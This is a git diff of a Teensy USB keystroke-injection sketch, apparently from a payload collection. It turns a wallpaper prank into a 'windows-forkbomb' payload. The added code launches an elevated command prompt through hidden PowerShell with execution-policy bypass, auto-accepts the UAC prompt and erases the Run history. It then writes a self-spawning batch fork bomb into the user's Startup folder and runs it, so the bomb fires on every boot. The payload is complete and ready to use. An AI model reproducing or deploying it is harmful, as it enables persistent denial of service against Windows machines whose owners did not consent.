1fbe55423c36b969a19f1210c8603e1506cee7b3
Kleo Bercero <kbeflo@gmail.com>
2017-01-20 17:23:55 +0800

    new payloads
    minor changes

--- Payloads/windows-forkbomb.ino
+++ Payloads/windows-forkbomb.ino
@@ -2,11 +2,19 @@
 
 Teensy ( https://www.pjrc.com/teensy/ )
 
-Payload: wallpaper-prank
+Payload: windows-forkbomb
 
-Description: Minimize all windows, take screenshot, disable desktop icons, saves screenshot and sets as wallpaper. Tested on Windows 10.
+Disclaimer: Use at own risk, the functions used in this program will render your machine virtually useless.
 
-Concept: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---Wallpaper-prank
+Description: Opens a command prompt as administrator with run, uses con copy to create fork bomb batch.
+
+Then save as .bat file under the startup folder and runs every startup.
+
+You can optionally choose to avoid executing the fork bomb after writing the batch file.
+
+Using US Keyboard Layout. Modify delays depending on the target machine. Tested Windows 7 and Windows 10.
+
+Concept: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---fork-bomb, https://forums.hak5.org/index.php?/topic/39367-mr-robot-hack-optimized-payload/&do=findComment&comment=282928
 
 Created by Kleo Bercero - @kbeflo - kbeflo@gmail.com
 
@@ -34,33 +42,7 @@ void setup() {
   // Turn on the LED pin so we know the device is running.
   digitalWrite(LED_PIN, HIGH);
   delay(3000);
-  // Show desktop
-  Keyboard.set_modifier(MODIFIERKEY_GUI);
-  Keyboard.set_key1(KEY_D);
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(500);
-  // Printscreen
-  Keyboard.set_key1(KEY_PRINTSCREEN);
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(500);
-  // Hide desktop icons
-  Keyboard.set_key1(KEY_MENU);
-  Keyboard.send_now();
-  Keyboard.set_key1(KEY_V);
-  Keyboard.send_now();
-  Keyboard.set_key1(KEY_D);
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(500);
-  // Open paint
+  // Run cmd as administrator on small window with white background, yellow text and clear run command history
   Keyboard.set_modifier(MODIFIERKEY_GUI);
   Keyboard.set_key1(KEY_R);
   Keyboard.send_now();
@@ -68,71 +50,64 @@ void setup() {
   Keyboard.set_key1(0);
   Keyboard.send_now();
   delay(500);
-  Keyboard.print("mspaint");
+  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass \"Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18&reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f' -Verb runAs\"");
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.set_modifier(0);
   Keyboard.set_key1(0);
   Keyboard.send_now();
-  delay(500);
-  // Paste Printscreen
-  Keyboard.set_modifier(MODIFIERKEY_CTRL);
-  Keyboard.send_now();
-  Keyboard.set_key1(KEY_V);
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(500);
-  // Save as wallpaper
+  delay(3000);
   Keyboard.set_modifier(MODIFIERKEY_ALT);
-  Keyboard.set_key1(KEY_F);
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(500);
-  Keyboard.set_key1(KEY_B);
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(500);
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(500);
-  Keyboard.print("26xxm74b5i.png");
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(500);
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(500);
-  // Close paint
-  Keyboard.set_modifier(MODIFIERKEY_ALT);
-  Keyboard.set_key1(KEY_F4);
+  Keyboard.set_key1(KEY_Y);
   Keyboard.send_now();
   Keyboard.set_modifier(0);
   Keyboard.set_key1(0);
   Keyboard.send_now();
   delay(1000);
-  // Clear run command history
-  Keyboard.set_modifier(MODIFIERKEY_GUI);
-  Keyboard.set_key1(KEY_R);
+  // Change directory to startup programs
+  Keyboard.print("cd %UserProfile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
+  Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.set_modifier(0);
   Keyboard.set_key1(0);
   Keyboard.send_now();
   delay(500);
-  Keyboard.print("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
+  // Write fork bomb batch file
+  Keyboard.print("copy con 6rgl4ljf4m.bat");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.print("@echo off");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.print(":START");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.print("start \"%UserProfile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\6rgl4ljf4m.bat\"");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.print("GOTO START");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(500);
+  Keyboard.set_modifier(MODIFIERKEY_CTRL);
+  Keyboard.set_key1(KEY_Z);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(500);
+  // End of file
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(500);
+  // Optional: Comment block to avoid executing fork bomb, making it dormant until the next and every startup.
+  Keyboard.print("6rgl4ljf4m.bat");
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.set_modifier(0);
